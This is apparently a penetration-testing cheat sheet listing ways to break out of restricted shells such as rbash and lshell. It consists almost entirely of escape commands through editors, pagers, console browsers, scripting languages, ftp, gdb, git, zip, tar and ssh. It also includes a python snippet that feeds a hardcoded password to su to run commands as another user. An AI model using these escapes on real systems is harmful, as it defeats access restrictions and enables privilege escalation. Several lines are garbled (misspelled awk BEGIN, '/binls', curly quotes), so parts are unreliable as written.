Limited Shell Escapes


Common restricted shells:
rbash
rksh
rzsh
lshell


General techniques:
Absolute Paths
	/bin/sh -i
	cp /bin/sh ./sh
	/bin/busybox sh
Console Editors
	--e.g. ed, ne, nano, pico, vim, nmap --interactive
	:!/binls -l .b*
		--enumeration
	:set shell=/bin/sh
	:shell
		--set env variables to escape restricted shell
	:!/bin/bash
		--execute new shell instance to escape restricted shell (vi/vim/nmap -i)
	!'/bin/sh'
		--execute new shell instance to escape restricted shell (ed)
	ne
		>prefs >Load Prefs
		--arbitrary file load/directory traversal (ne)
	pico -s "/bin/bash"
		>/bin/bash >CTRL+T
Pager Commands
	more ~/.bashrc
	OR
	less .bashrc
		!'sh'
		--target file must be long enough to paginate
	man ls
	pinfo ls
Console Browsers
	--e.g. lynx, links, elinks
	links
		>File >OS shell
	lynx
		>o >Editor>=/usr/bin/vim >"Accept Changes" >e
	lynx --editor=/usr/bin/vim www.google.com
	export EDITOR=/usr/bin/vim && elinks google.com
		>ENTER >F4
Email Clients
	mutt
		>! >/bin/sh
	find -name .* -exec awk 'BEING {system("cd /root; ls"}' \;
Programming Languages
	awk 'BEGIN {system("/bin/sh")}'
	expect
		>spawn sh
	python -c 'import os; os.system("/bin/bash");'
	python -c '__import__("os").system("id")'
	irb
		>exec '/bin/sh'
	perl -e 'system("/bin/bash");'
	perl -e 'exec("sh -i");'
	php -a
		>system("/bin/sh");
	php -r 'exec("sh -i");'
	lus
		>os.execute('/bin/sh').
File Transfer
	ftp
		!/bin/sh
	scp -S /path/to/execute x y:
Debuggers
	gdb
		!/bin/sh
SSH
	ssh username@localhost -t "/bin/sh"
	ssh username@127.0.0.1 -t "bash --noprofile"
	ssh -o ProxyCommand="sh -c /tmp/getshell.sh"
Version Control
	git help status
		>!/bin/bash
Compression
	zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
	tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
Increase job priority
	nice /bin/bash





Specific Techniques
	rbash Jail Escape: RequestTTY no
ssh -o RequestTTY=no user@ip

	Bash --noprofile
ssh monitor@127.0.0.1 -t "bash --noprofile" 




Interactive TTY Shells
/usr/bin/expect sh
python -c ‘import pty; pty.spawn(“/bin/sh”)’
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
	--execute one command with su as another user if you do not have access to the shell
